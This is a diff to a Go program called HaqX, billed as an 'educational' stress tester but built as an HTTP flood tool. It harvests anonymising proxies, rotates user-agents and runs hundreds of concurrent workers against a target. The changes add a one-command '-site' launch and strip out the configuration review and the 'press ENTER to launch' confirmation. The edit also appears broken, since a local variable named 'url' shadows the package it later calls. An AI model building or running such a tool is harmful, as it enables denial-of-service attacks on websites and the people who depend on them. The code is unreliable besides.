@@ -1,7 +1,7 @@
 package main
 
 /*
- HaqX - Advanced Network Stress Testing Tool (Optimized)
+ HaqX - Advanced Network Stress Testing Tool (Optimized - One Line Mode)
  For Educational & Authorized Testing Only
 */
 
@@ -26,7 +26,7 @@ import (
 	"time"
 )
 
-const VERSION = "4.0.1"
+const VERSION = "4.0.2"
 const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-"
 const ACCEPT = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
@@ -57,6 +57,7 @@ type (
 		ProxyStats  map[string]int
 		Index       int
 		CurrentProxy string
+		OneLine     bool
 		sync.Mutex
 	}
 	
@@ -106,6 +107,7 @@ func NewConfig() *Target {
 		Method:      "GET",
 		Proxy:       true,
 		ProxyStats:  make(map[string]int),
+		OneLine:     true,
 		Agents: []string{
 			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
 			"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
@@ -249,7 +251,7 @@ func (h *ProxyHunter) Harvest() []string {
 		}
 	}
 	
-	fmt.Printf("🔍 Testing %d proxies...\n", len(unique))
+	fmt.Printf("🔍 Testing %d proxies... ", len(unique))
 	var fastProxies []string
 	var mu sync.Mutex
 	var wgFilter sync.WaitGroup
@@ -271,7 +273,7 @@ func (h *ProxyHunter) Harvest() []string {
 	}
 	wgFilter.Wait()
 	
-	fmt.Printf("✅ Found %d fast proxies\n", len(fastProxies))
+	fmt.Printf("✅ %d fast proxies\n", len(fastProxies))
 	return fastProxies
 }
 
@@ -441,6 +443,7 @@ func main() {
 		dur     int
 		method  string
 		noprox  bool
+		url     string
 	)
 
 	flag.BoolVar(&showVer, "v", false, "Show version")
@@ -449,6 +452,7 @@ func main() {
 	flag.BoolVar(&noprox, "noprox", false, "Disable proxies")
 	flag.StringVar(&agents, "agents", "", "User-agent file")
 	flag.StringVar(&cfg.Data, "data", "", "POST data")
+	flag.StringVar(&url, "site", "", "Target URL")
 	flag.IntVar(&conns, "c", 0, "Connections (default: 500)")
 	flag.IntVar(&to, "t", 0, "Timeout seconds (default: 5)")
 	flag.IntVar(&rate, "r", 0, "Rate limit (default: 1000)")
@@ -471,149 +475,59 @@ func main() {
 	if noprox { cfg.Proxy = false }
 	
 	Banner()
-	fmt.Println("⚙️  Configure attack parameters (Enter for defaults)\n")
 	
 	reader := bufio.NewReader(os.Stdin)
 	
-	fmt.Print("🎯 Target URL: ")
-	target, _ := reader.ReadString('\n')
-	target = strings.TrimSpace(target)
-	for target == "" {
-		fmt.Print("⚠️  Target required: ")
-		target, _ = reader.ReadString('\n')
+	// If URL provided via flag, use it
+	if url != "" {
+		cfg.URL = url
+	} else {
+		fmt.Print("🎯 Target URL: ")
+		target, _ := reader.ReadString('\n')
 		target = strings.TrimSpace(target)
+		for target == "" {
+			fmt.Print("⚠️  Target required: ")
+			target, _ = reader.ReadString('\n')
+			target = strings.TrimSpace(target)
+		}
+		cfg.URL = target
 	}
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		target = "http://" + target
+	
+	if !strings.HasPrefix(cfg.URL, "http://") && !strings.HasPrefix(cfg.URL, "https://") {
+		cfg.URL = "http://" + cfg.URL
 	}
-	cfg.URL = target
+	
 	parsed, err := url.Parse(cfg.URL)
 	if err != nil {
 		fmt.Printf("❌ Invalid URL: %v\n", err)
 		return
 	}
-	fmt.Printf("✅ Target: %s\n", cfg.URL)
 
 	if cfg.Proxy {
-		fmt.Println("\n🌐 Harvesting & filtering proxies...")
+		fmt.Println("🌐 Harvesting & filtering proxies...")
 		hunter := Hunter()
 		proxies := hunter.Harvest()
 		if len(proxies) > 0 {
 			cfg.Pool = proxies
-			fmt.Printf("✅ %d fast proxies ready\n", len(proxies))
 		} else {
-			fmt.Println("⚠️  No proxies found, continuing without")
 			cfg.Proxy = false
 		}
 	}
 
-	fmt.Printf("\n🔢 Connections [%d]: ", cfg.Connections)
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v > 0 {
-			cfg.Connections = v
+	// One-line config - skip all confirmations
+	if cfg.OneLine {
+		fmt.Printf("🚀 Starting: %s | Workers: %d | Timeout: %v | Rate: %d req/s", 
+			cfg.URL, cfg.Connections, cfg.Timeout, cfg.Rate)
+		if cfg.Proxy && len(cfg.Pool) > 0 {
+			fmt.Printf(" | Proxies: %d", len(cfg.Pool))
 		}
-	}
-	fmt.Printf("✅ %d\n", cfg.Connections)
-
-	fmt.Printf("\n⏱️  Timeout (s) [%d]: ", int(cfg.Timeout.Seconds()))
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v > 0 {
-			cfg.Timeout = time.Duration(v) * time.Second
-		}
-	}
-	fmt.Printf("✅ %v\n", cfg.Timeout)
-
-	fmt.Printf("\n🚀 Rate (req/s) [%d]: ", cfg.Rate)
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v >= 0 {
-			cfg.Rate = v
-		}
-	}
-	fmt.Printf("✅ %d\n", cfg.Rate)
-
-	fmt.Printf("\n📡 Method [%s]: ", cfg.Method)
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		m := strings.ToUpper(strings.TrimSpace(input))
-		if m == "GET" || m == "POST" { cfg.Method = m }
-	}
-	fmt.Printf("✅ %s\n", cfg.Method)
-
-	if cfg.Method == "POST" {
-		fmt.Print("\n📝 POST data (empty = random): ")
-		if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-			cfg.Data = strings.TrimSpace(input)
-		} else {
-			cfg.Data = RandomData()
-			fmt.Printf("✅ Random: %s\n", cfg.Data)
-		}
+		fmt.Println()
 	}
 
-	fmt.Printf("\n⏰ Duration (s, 0=unlimited) [%d]: ", cfg.Duration)
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		if v, err := strconv.Atoi(strings.TrimSpace(input)); err == nil && v >= 0 {
-			cfg.Duration = v
-		}
+	Stats = &Metric{
+		Codes:   make(map[int]int64),
+		Started: time.Now(),
 	}
-	if cfg.Duration > 0 {
-		fmt.Printf("✅ %d seconds\n", cfg.Duration)
-	} else {
-		fmt.Println("✅ ♾️  Unlimited")
-	}
-
-	fmt.Printf("\n🛡️  Safe mode [%t]: ", Secure)
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		if strings.ToLower(strings.TrimSpace(input)) == "y" {
-			Secure = true
-		} else {
-			Secure = false
-		}
-	}
-	fmt.Printf("✅ %t\n", Secure)
-
-	fmt.Print("\n📄 User-agent file: ")
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		if data, err := os.ReadFile(strings.TrimSpace(input)); err == nil {
-			var list []string
-			for _, a := range strings.Split(string(data), "\n") {
-				if strings.TrimSpace(a) != "" {
-					list = append(list, strings.TrimSpace(a))
-				}
-			}
-			if len(list) > 0 {
-				cfg.Agents = list
-				fmt.Printf("✅ %d agents loaded\n", len(list))
-			}
-		}
-	}
-
-	fmt.Print("\n📋 Custom headers (key:value, comma separated): ")
-	if input, _ := reader.ReadString('\n'); strings.TrimSpace(input) != "" {
-		for _, h := range strings.Split(strings.TrimSpace(input), ",") {
-			parts := strings.SplitN(strings.TrimSpace(h), ":", 2)
-			if len(parts) == 2 {
-				cfg.Headers = append(cfg.Headers, strings.TrimSpace(parts[0])+": "+strings.TrimSpace(parts[1]))
-			}
-		}
-		if len(cfg.Headers) > 0 {
-			fmt.Printf("✅ %d headers added\n", len(cfg.Headers))
-		}
-	}
-
-	if agents != "" {
-		if data, err := os.ReadFile(agents); err == nil {
-			var list []string
-			for _, a := range strings.Split(string(data), "\n") {
-				if strings.TrimSpace(a) != "" {
-					list = append(list, strings.TrimSpace(a))
-				}
-			}
-			if len(list) > 0 {
-				cfg.Agents = list
-			}
-		}
-	}
-
-	ShowConfig(cfg)
 
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
@@ -622,7 +536,7 @@ func main() {
 	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
 		<-sig
-		fmt.Println("\n⚠️  Interrupted, shutting down...")
+		fmt.Println("\n⚠️  Interrupted")
 		cancel()
 	}()
 
@@ -634,10 +548,6 @@ func main() {
 		throttle = NewThrottle(cfg.Rate)
 		defer throttle.Stop()
 	}
-
-	fmt.Print("\n⚡ Press ENTER to launch or Ctrl+C to abort...")
-	reader.ReadString('\n')
-	fmt.Println()
 
 	Launch(ctx, cancel, cfg, parsed, factory, throttle)
 
@@ -691,17 +601,9 @@ func Launch(ctx context.Context, cancel context.CancelFunc, cfg *Target, parsed 
 		timer := time.NewTimer(time.Duration(cfg.Duration) * time.Second)
 		go func() {
 			<-timer.C
-			fmt.Println("\n⏰ Time's up!")
 			cancel()
 		}()
 	}
-
-	fmt.Printf("🚀 Attacking %s\n", cfg.URL)
-	if cfg.Proxy && len(cfg.Pool) > 0 {
-		fmt.Printf("🌐 %d proxies active\n", len(cfg.Pool))
-	}
-	fmt.Printf("⚙️  %d workers | %v timeout | %d req/s\n\n",
-		cfg.Connections, cfg.Timeout, cfg.Rate)
 
 	for i := 0; i < cfg.Connections; i++ {
 		wg.Add(1)
@@ -721,6 +623,7 @@ func Launch(ctx context.Context, cancel context.CancelFunc, cfg *Target, parsed 
 		for {
 			select {
 			case <-ctx.Done():
+				fmt.Println()
 				return
 			case <-monitor:
 				return
@@ -768,9 +671,6 @@ func Worker(ctx context.Context, id int, cfg *Target, parsed *url.URL, factory *
 			if success {
 				atomic.AddInt64(&Stats.Total, 1)
 			} else {
-				if Debug {
-					fmt.Printf("\n🔴 Worker %d: failed\n", id)
-				}
 				atomic.AddInt64(&Stats.Errors, 1)
 			}
 		}
@@ -809,7 +709,6 @@ func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL
 			
 			Arm(req, cfg, host, rng)
 			
-			start := time.Now()
 			resp, err := client.Do(req)
 			if err != nil {
 				if attempt < 2 {
@@ -831,14 +730,7 @@ func Fire(ctx context.Context, client *http.Client, cfg *Target, parsed *url.URL
 			cfg.MarkProxy(success)
 			
 			if Secure && resp.StatusCode >= 500 {
-				if Debug {
-					fmt.Printf("\n⚠️  %d from server\n", resp.StatusCode)
-				}
 				return false
-			}
-			
-			if time.Since(start) > 2*time.Second && Debug {
-				fmt.Printf("\n🐌 Slow response: %v\n", time.Since(start))
 			}
 			
 			return success
@@ -896,35 +788,6 @@ func Banner() {
 ` + "\033[0m")
 	fmt.Println("\033[97m" + "🔥 HaqX v" + VERSION + " ⚡" + "\033[0m")
 	fmt.Println("\033[97m" + "Educational & Authorized Testing Only" + "\033[0m")
-	fmt.Println()
-}
-
-func ShowConfig(cfg *Target) {
-	fmt.Println()
-	fmt.Println("📋 Attack Configuration")
-	fmt.Printf("  🎯 Target:   %s\n", cfg.URL)
-	fmt.Printf("  🔢 Workers:  %d\n", cfg.Connections)
-	fmt.Printf("  ⏱️  Timeout:  %v\n", cfg.Timeout)
-	fmt.Printf("  🚀 Rate:     %d req/s\n", cfg.Rate)
-	fmt.Printf("  📡 Method:   %s\n", cfg.Method)
-	if cfg.Method == "POST" && cfg.Data != "" {
-		fmt.Printf("  📝 Data:     %s\n", cfg.Data)
-	}
-	if cfg.Duration > 0 {
-		fmt.Printf("  ⏰ Time:     %d seconds\n", cfg.Duration)
-	} else {
-		fmt.Printf("  ⏰ Time:     ♾️  Unlimited\n")
-	}
-	fmt.Printf("  🛡️  Safe:     %t\n", Secure)
-	fmt.Printf("  📄 Agents:   %d\n", len(cfg.Agents))
-	if cfg.Proxy && len(cfg.Pool) > 0 {
-		fmt.Printf("  🌐 Proxies:  %d (filtered)\n", len(cfg.Pool))
-	} else {
-		fmt.Printf("  🌐 Proxies:  ❌\n")
-	}
-	if len(cfg.Headers) > 0 {
-		fmt.Printf("  📋 Headers:  %d\n", len(cfg.Headers))
-	}
 	fmt.Println()
 }
 
